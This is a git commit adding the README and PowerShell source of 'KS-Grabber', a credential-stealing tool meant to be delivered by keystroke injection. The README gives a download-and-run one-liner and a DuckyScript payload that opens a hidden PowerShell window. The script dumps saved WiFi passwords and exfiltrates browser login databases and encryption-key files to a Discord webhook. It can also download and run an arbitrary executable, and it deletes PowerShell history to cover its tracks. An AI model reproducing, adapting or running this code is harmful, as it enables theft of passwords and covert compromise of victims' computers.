575004e86579ddef70b7f2d62edd92af268ff3b4
Marcos Vinicius de Sousa Castro <40245844+maskara10@users.noreply.github.com>
2024-08-08 13:46:09 -0300

    Initial commit

---
+++ README.md
@@ -0,0 +1,55 @@
+# ✨ KS-Grabber
+
+KS-Grabber is a keystroke injection grabber that is fully modular and developed with PowerShell. This script allows you to collect information from various sources and send it to a webhook.
+
+## Usage
+
+Run the following command in PowerShell to execute KS-Grabber:
+
+```powershell
+$hookUrl = '<webhook goes here>'
+iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content
+```
+
+## Configuration
+
+Before running the script, you need to configure the boolean variables that enable the grabber modules. Open the script and set the following variables:
+
+```powershell
+$gatherPcData = $true  <# Gather PC data #>
+$gatherWifiProfiles = $true  <# Gather WiFi profiles #>
+$gatherOpenPorts = $true  <# Gather open ports #>
+$executeExe = $false  <# Execute and EXE File #>
+$gatherBrowserPass = $false <# [WIP] Gather passwords saved in browsers #>
+$removeTraces = $true  <# Remove traces #>
+```
+
+You can also change some extra variables according to your preferences regarding the modules:
+
+```powershell
+$keyContentLabel = "Key Content"  <# Only if the system is not in en-us or en-br. #>
+$exeUrl = "https://somerandomwebsite.lol/yourfile.exe" <# The EXE file referring to the executeExe function. #>
+```
+
+**WARNING:** It is mandatory to configure the webhook correctly. Replace the value of the `$hookUrl` variable with your webhook:
+
+```powershell
+$hookUrl = "https://discord.com/api/webhooks/wompwomp"
+```
+
+Otherwise, the script will not work!
+
+## Example Attack
+
+Here is an example attack using the grabber:
+
+```plaintext
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell -windowstyle hidden -command "$hookUrl = '<webhook goes here>'; iex (iwr https://raw.githubusercontent.com/Niximkk/ks-grabber/main/ks-grabber.ps1).content"
+ENTER
+```
+### ⭐ Made for educational purposes (even though I don't know how it can be used in an educational way), I am not responsible for how this tool is used.
---
+++ ks-grabber.ps1
@@ -0,0 +1,268 @@
+<# Visual #>
+$Host.UI.RawUI.WindowTitle = "✨ KS-Grabber"
+
+Write-Output "
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⣠⣴⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢾⡇⠀⢀⣀⣀⣀⡀⢉⡽⠁⠀⠀⣿⣦⠤⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠸⡷⠀⣀⠤⠤⢤⣴⡿⠁⠀⢰⠀⣿⣿⣷⣤⠶⢶⣬⣭⣕⣒⠠⢄⣀⠀⠀⠀⠀⠀⠀        ____  ___________  ______ ____________
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⡇⠀⠀⡞⣾⠁⠀⠀⠘⠀⠹⣇⣀⣙⡆⠀⠀⠈⠉⠙⠛⠷⠮⣉⠲⢄⡀⠀⠀⠀      / __ \/ ____// __ \/ ____// ___// ____/\
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣀⢸⡀⢰⢃⣿⣧⣴⡶⣿⣿⡶⢼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠛⠷⣤⡀     / / / / __/ // / / /\__ \ / __/ / /\ ___\/
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡏⠀⡇⢸⢻⣿⣿⣿⣶⣌⣻⣿⣿⣿⣥⣼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙    / /_/ / /___// /_/ /___/ // /___/ /_/__
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⢱⢸⢺⣿⣿⣥⠈⠛⠣⢤⣙⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   /_____/_____//_____//____//_____/\_____/\
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣦⠈⣿⣼⣿⣿⣿⡾⠆⠀⠙⣿⣿⠇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \_____\\____\\\____\\____\\_____\_\____\/
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢯⠀⢻⣿⣿⣿⣿⣶⣶⣷⣾⣿⣣⣴⣾⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   Dedsec has given you the truth. Do what you will.
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠖⢿⡆⠸⣏⢳⡼⣿⣿⣿⣿⣿⣟⠉⠙⠛⠋⣭⣷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀   
+⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V1.2
+⠀⠀⠀⠀⠀⠀⣼⣿⠢⠬⣭⣿⣿⣧⢸⣿⣯⡑⠦⣾⣿⡟⣡⣔⣁⠴⢟⣱⠂⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀   @im.nix
+⠀⠀⠀⠀⣠⣾⠋⠀⣄⢀⣿⣿⢿⣷⠀⣿⢧⡙⢦⣙⣿⣿⣽⣿⣁⣹⠟⠛⢀⡇⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀ 
+⠀⠀⠀⣰⠃⣏⣹⣦⣿⣿⡿⠁⠀⢿⣇⢘⡶⢬⣉⣿⣽⣿⣟⣻⣤⠆⣠⣺⣾⡇⡂⠀⢠⠘⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⢰⡇⢰⠃⢛⣿⣯⣉⣠⣤⣶⣿⣿⣿⣿⣿⠀⣈⣛⣿⡿⠟⢀⠜⠁⣹⣿⣷⣿⠀⣸⢰⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⣿⢣⠇⠀⣾⣿⣿⣟⣏⡜⢧⣬⣿⣿⣯⣽⣀⣿⣿⣟⣁⠔⠁⠀⠀⣽⣿⣿⠏⢀⣿⠈⡇⠀⠀⠀⠀⠀⠀
+⠀⡼⠃⣨⣤⣴⣿⢃⢹⢻⡾⠀⠘⢿⣿⣟⠘⣿⣿⠿⣿⣏⣄⣀⡀⡀⠀⣸⡿⣿⠇⢈⡏⠀⡇⠀⠀⠀⠀⠀⠀
+⠀⡇⣾⠿⠟⢛⠇⡸⣾⢸⡇⣀⣦⣈⣿⣿⡆⢯⣀⣲⠛⠉⠉⠑⠾⣿⢃⣿⡇⠌⠀⣼⡗⠀⡇⠀⠀⠀⠀⠀⠀
+⢀⣧⠁⠀⣠⠊⠀⢳⠃⠘⠇⠿⣿⣿⣿⣿⡆⢸⣿⣷⣤⣀⣠⠤⠊⢀⣼⣿⡄⢀⠼⣿⡇⢸⡇⠀⠀⠀⠀⠀⠀
+⠈⠙⣇⢻⣿⣦⣴⣃⡄⠀⢀⠀⠈⣿⡀⠹⣿⠒⡿⠟⠛⢋⡤⠒⢁⢾⣿⠙⡠⠋⠀⠛⠁⣸⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠈⠓⠾⣅⣈⣉⣀⠀⠠⢷⡀⢸⣆⣠⣿⡄⢻⣴⣾⡏⠀⠀⠀⣾⣷⣾⣷⠒⢉⡀⢀⢿⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣾⣧⣸⣿⣿⣿⣧⠈⡿⣟⡠⢀⠄⣠⣿⣿⠟⢛⡉⠛⠀⡞⣼⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡿⢸⣿⣏⣿⣿⣿⣿⣿⣽⡀⢹⠰⣚⣯⣾⣿⣿⡟⠉⠀⢀⡀⢠⢷⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡇⢸⣿⡿⣿⡿⣿⣿⣿⣿⣷⠈⣦⣿⡯⠀⡾⠋⠁⠰⣶⡟⢁⠎⣿⠁⠀⠀⠀⠀⠀⠀⠀"
+
+<# Features #>
+$features = @{
+    "gatherPcData" = $true
+    "gatherWifiProfiles" = $true
+    "gatherOpenPorts" = $true
+    "executeExe" = $false
+    "gatherBrowserPass" = $true
+    "gatherInstalledSoftware" = $true
+    "removeTraces" = $true
+}
+foreach ($feature in $features.Keys) { if (-not (Test-Path "variable:$feature")) { Set-Variable -Name $feature -Value $features[$feature] } }
+
+<# Extras #>
+if ([string]::IsNullOrEmpty($keyContentLabel)) { $keyContentLabel = "Conteúdo da Chave|Key Content" }
+if ([string]::IsNullOrEmpty($hookUrl)) { Write-Output "You need to define a Discord webhook URL."; exit }
+if ($executeExe -and [string]::IsNullOrEmpty($exeUrl)) { Write-Output "You need to define a URL for your executable."; exit }
+
+<# Functions #>
+function Send-File { ## TODO: Send all in one message (embed + files)
+    param (
+        [string]$filePath,
+        [string]$prefix
+    )
+    
+    if (Test-Path $filePath) {
+        $fileContent = [System.IO.File]::ReadAllBytes($filePath)
+        $fileName = [System.IO.Path]::GetFileName($filePath)
+
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $bodyLines = @(
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"file`"; filename=`"$prefix-$fileName`"",
+            "Content-Type: application/octet-stream",
+            "",
+            [System.Text.Encoding]::Default.GetString($fileContent),
+            "--$boundary--"
+        )
+        $body = [System.String]::Join("`r`n", $bodyLines)
+
+        $headers = @{
+            "Content-Type" = "multipart/form-data; boundary=$boundary"
+        }
+
+        $null = Invoke-RestMethod -Uri $hookUrl -Method Post -Headers $headers -Body $body
+    }
+}
+
+<# PC Dump #>
+if ($gatherPcData) {
+    Write-Output "[ + ] Gathering computer data"
+    $specs = Get-ComputerInfo -Property CsManufacturer, CsModel, CsTotalPhysicalMemory, BiosBIOSVersion, CsProcessors
+}
+
+<# Wifi Profiles Dump #>
+if ($gatherWifiProfiles) {
+    Write-Output "[ + ] Gathering wifi profiles"
+    $WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
+    $WifiInfo = foreach($SSID in $WirelessSSIDs) {
+        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String $keyContentLabel) -replace ".*:\s+"
+        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
+    }
+    if ([string]::IsNullOrEmpty($WifiInfo)) { $WifiInfo= "ERROR: No wireless card detected" }
+}
+
+<# Open Ports Dump #>
+if ($gatherOpenPorts) {
+    Write-Output "[ + ] Gathering open ports"
+    $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort -Unique
+    $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort -Unique
+    $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
+}
+
+<# Installed Software #>
+if ($gatherInstalledSoftware) {
+    Write-Output "[ + ] Gathering installed software"
+    $installedSoftware = Get-ChildItem -Path "C:\Program Files" | Select-Object -ExpandProperty Name | Out-String
+    if ([string]::IsNullOrEmpty($installedSoftware)) {
+        $installedSoftware = "ERROR: No software found or access denied"
+    }
+}
+
+<# Execute File #>
+if ($executeExe) {
+    Write-Output "[ + ] Executing EXE"
+    $tempFile = "$env:TEMP\UwU.exe"
+    Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
+    Start-Process -FilePath $tempFile
+}
+
+<# Json Body #>
+$json = @{
+    embeds = @(
+        @{
+            title = "I have been pwned!"
+            color = 0
+            fields = @(
+                @{
+                    name = "Machine Name:"
+                    value = "``````$($env:COMPUTERNAME)``````"
+                    inline = $true
+                },
+                @{
+                    name = "Username:"
+                    value = "``````$env:USERNAME``````"
+                    inline = $true
+                },
+                @{
+                    name = "Public IP:"
+                    value = "``````$(Invoke-RestMethod -Uri "http://ipinfo.io/ip")``````"
+                    inline = $true
+                }
+            )
+            author = @{
+                name = "KS-Grabber V1.0"
+            }
+            footer = @{
+                text = "Dedsec has given you the truth. Do what you will."
+            }
+            thumbnail = @{
+                url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/qk5c358p.png"
+            }
+        }
+        if ($gatherPcData) {
+            @{
+                color = 0
+                fields = @(
+                    @{
+                        name = "Manufacturer:"
+                        value = "``$($specs.CsManufacturer)``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Model:"
+                        value = "``$($specs.CsModel)``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Processors:"
+                        value = "``$($specs.CsProcessors.name)``"
+                    },
+                    @{
+                        name = "Total Physical Memory:"
+                        value = "``$([math]::round($specs.CsTotalPhysicalMemory / 1GB, 2))GB``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Runs doom?"
+                        value = "``Yes``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Bios Version:"
+                        value = "``$($specs.BiosBIOSVersion)``"
+                    }
+                )
+                author = @{
+                    name = "PC Specs"
+                }
+            }
+        }
+        if ($gatherWifiProfiles) {
+            @{
+                description = "``````$($WifiInfo | Out-String)``````"
+                color = 0
+                author = @{
+                    name = "Wifi Passwords"
+                }
+            }
+        }
+        if ($gatherOpenPorts) {
+            @{
+                description = "``````$($openPorts)``````"
+                color = 0
+                author = @{
+                    name = "Open Ports"
+                }
+            }
+        }
+        if ($gatherInstalledSoftware) {
+            @{
+                description = "``````$($installedSoftware)``````"
+                color = 0
+                author = @{
+                    name = "Installed Software"
+                }
+            }
+        }
+    )
+    username = "$env:USERNAME :3"
+    avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/hjz7cham.png"
+    attachments = @()
+} | ConvertTo-Json -Depth 4
+
+<# Send Main Webhook #>
+Write-Output "[ + ] Sending base webhook"
+$null = Invoke-RestMethod -Uri $hookUrl -Method Post -ContentType "application/json" -Body $json
+
+<# [WIP] Browser Saved Passwords #>
+if($gatherBrowserPass){
+    Write-Output "[ + ] Gathering saved passwords"
+    $browserData = @(
+        @{
+            ProcessName = "chrome"
+            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Local State"
+            Prefix = "Chrome"
+        },
+        @{
+            ProcessName = "brave"
+            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"
+            Prefix = "Brave"
+        },
+        @{
+            ProcessName = "msedge"
+            LoginDataPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+            LocalStatePath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Edge\User Data\Local State"
+            Prefix = "Edge"
+        }
+    )
+
+    foreach ($browser in $browserData) {
+        try { Stop-Process -Name $browser.ProcessName -Force -ErrorAction SilentlyContinue; Write-Output "[ ! ] Stopping $($browser.ProcessName)..."} 
+        catch {}
+        if ((Test-Path $browser.LoginDataPath) -and (Test-Path $browser.LocalStatePath)) {
+            Write-Output "[ + ] $($browser.prefix)'s passwords gathered."
+            Send-File -filePath $browser.LoginDataPath -prefix $browser.Prefix
+            Send-File -filePath $browser.LocalStatePath -prefix $browser.Prefix
+        }
+    }
+}
+
+<# Remove Traces #>
+if ($removeTraces) {
+    Write-Output "[ - ] Removing traces"
+    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+}
+
+Write-Output "✨ You have been pwned lmaooo :3 :3"
